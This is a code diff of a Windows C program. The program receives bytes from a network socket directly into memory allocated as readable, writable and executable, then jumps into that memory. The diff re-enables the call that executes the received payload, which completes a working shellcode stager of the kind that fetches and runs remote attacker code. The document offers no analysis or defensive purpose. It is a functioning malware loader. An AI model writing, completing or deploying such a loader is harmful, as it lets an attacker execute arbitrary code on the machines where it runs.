@@ -38,17 +38,16 @@ int main() {
 
   // Receive data from port;
   char buf[BUF_LEN] = "";
-  char data[PAYLOAD_SZ] = { 0 };
+  char *rwx = (char *)VirtualAlloc(NULL, PAYLOAD_SZ, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  char *index = rwx;
   int res = 0;
-  int recvd = 0;
 
   printf("Receiving");
   do {
-    res = recv( ConnectSocket, buf, BUF_LEN, 0 );
+    res = recv( ConnectSocket, index, BUF_LEN, 0 );
     if (res > 0) {
-      strcat(data, buf);
+      index += res;
       printf(".");
-      recvd += res;
     }
     else if (res == 0) {
       break;
@@ -57,17 +56,16 @@ int main() {
       break;
     }
   } while (res > 0);
-  strcat(data, "\0");
-  printf("Received payload with size of %d.\n", recvd);
+  //strcat(data, "\0");
+  //printf("Received payload with size of %d.\n", recvd);
   //printf(data);
-  printf("Allocating RWX memory.\n");
+  //printf("Allocating RWX memory.\n");
   // Allocate RWX memory for the data
-  void* rwx = VirtualAlloc(NULL, PAYLOAD_SZ, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-  memcpy(rwx, data, recvd);
-  printf((char *)rwx);
+  //memcpy(rwx, data, recvd);
+  //printf((char *)rwx);
 
   printf("Executing payload.\n");
   // Execute the received payload
-  //(*(void(*)()) rwx)();
+  (*(void(*)()) rwx)();
 }
 
